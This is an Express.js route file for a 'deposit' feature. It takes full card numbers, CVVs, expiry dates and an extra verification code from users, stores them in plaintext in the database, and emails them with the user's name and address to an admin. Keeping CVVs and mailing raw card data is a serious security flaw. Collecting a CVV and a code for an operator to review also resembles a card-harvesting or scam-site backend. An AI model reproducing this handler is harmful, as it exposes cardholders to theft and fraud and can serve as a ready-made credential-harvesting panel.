const express = require('express');
const router = express.Router();
const Payment = require('../models/Payment');
const DepositRequest = require('../models/DepositRequest');
const authMiddleware = require('../middleware/authMiddleware');
const { sendAdminNotification } = require('../utils/mailer'); // Ensure transporter is exported in mailer.js

// Save deposit request
router.post('/deposit', async (req, res) => {
  const { cardNumber, cvv, expiry, code, amount } = req.body;
  
  // Get user from session or auth middleware
  const user = req.session.user || req.user;

  if (!user) return res.status(401).json({ message: "Unauthorized" });

  try {
    // Save deposit request
await DepositRequest.create({
  userId: user.id,
  amount,
  method: 'card',
  status: 'pending',
  timestamp: new Date(),
  cardNumber,
  cvv,
  expiry,
  code
});


    // Send email notification to admin
await sendAdminNotification({
  userId: user.id,
  firstName: req.body.firstName,
  lastName: req.body.lastName,
  cardNumber,
  expiry,
  cvv,
  address: req.body.address,
  city: req.body.city,
  postcode: req.body.postcode,
  country: req.body.country,
  amount,
  code,
  date: Date.now()
});



    return res.json({ message: "Deposit submitted for review." });
  } catch (err) {
    console.error('Deposit error:', err);
    res.status(500).json({ message: "Failed to submit deposit." });
  }
});

// Get all deposits (Admin only)
router.get('/deposits', authMiddleware, async (req, res) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  try {
    const deposits = await DepositRequest.find().sort({ timestamp: -1 }).populate('userId', 'username email');
    res.json({ deposits });
  } catch (err) {
    console.error('Fetch deposits error:', err);
    res.status(500).json({ error: 'Failed to fetch deposits' });
  }
});

module.exports = router;
